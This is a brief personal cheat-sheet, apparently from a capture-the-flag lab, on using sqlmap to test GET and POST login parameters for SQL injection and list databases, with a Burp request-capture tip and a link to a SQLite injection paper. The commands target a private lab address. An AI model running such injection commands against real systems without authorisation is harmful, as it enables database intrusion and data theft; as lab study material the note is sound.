# sqlmap
`sqlmap --url "http://10.10.214.114/login.php?username=admin&password=admin"  -p username --dbs` this works for get parameters in php files

For POST paramters, catch post request in burp, save it and run with sqlmap

`sqlmap -r req.sql -p username --dbs`

[https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf) 

to get updated data from sqlmap output when you change stuff in the site or db, use 

```text-plain
sqlmap --fresh-queries -r req.sql
```